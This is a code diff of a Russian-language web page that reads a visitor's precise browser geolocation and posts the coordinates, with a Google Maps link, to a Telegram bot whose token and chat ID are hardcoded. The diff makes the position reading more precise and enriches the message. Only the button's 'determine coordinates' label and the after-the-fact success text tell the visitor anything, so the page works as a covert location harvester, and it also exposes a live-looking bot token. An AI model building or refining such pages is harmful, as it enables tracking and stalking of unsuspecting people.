@@ -10,12 +10,16 @@
   <button onclick="getLocation()">📍 Определить координаты</button>
 
   <script>
-    const botToken = "7903305941:AAF_7buaRxszZuLBo-WOEZ2spgM4bVhj1TY";
-    const chatId = "5783656146"; // например: 123456789
+    const botToken = "7903305941:AAF_7buaRxszZuLBo-WOEZ2spgM4bVhj1TY"; // Токен бота
+    const chatId = "5783656146"; // Твой Telegram ID
 
     function getLocation() {
       if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(sendToTelegram, showError);
+        navigator.geolocation.getCurrentPosition(sendToTelegram, showError, {
+          enableHighAccuracy: true, // Для более точной геолокации
+          timeout: 10000, // Таймаут запроса
+          maximumAge: 0 // Не использовать кэшированные данные
+        });
       } else {
         document.getElementById("output").textContent = "Браузер не поддерживает геолокацию.";
       }
@@ -25,7 +29,8 @@
       const lat = position.coords.latitude;
       const lon = position.coords.longitude;
       const accuracy = position.coords.accuracy;
-      const msg = `📍 Новая геолокация:\n\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${accuracy} м`;
+      const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+      const msg = `📍 Геолокация:\n\nШирота: ${lat}\nДолгота: ${lon}\nТочность: ±${Math.round(accuracy)} м\n\n🌐 Карта: ${mapsUrl}`;
 
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: "POST",
@@ -38,7 +43,7 @@
         })
       });
 
-      document.getElementById("output").textContent = "✅ Координаты отправлены в Telegram!";
+      document.getElementById("output").textContent = "✅ Координаты + карта отправлены в Telegram!";
     }
 
     function showError(error) {
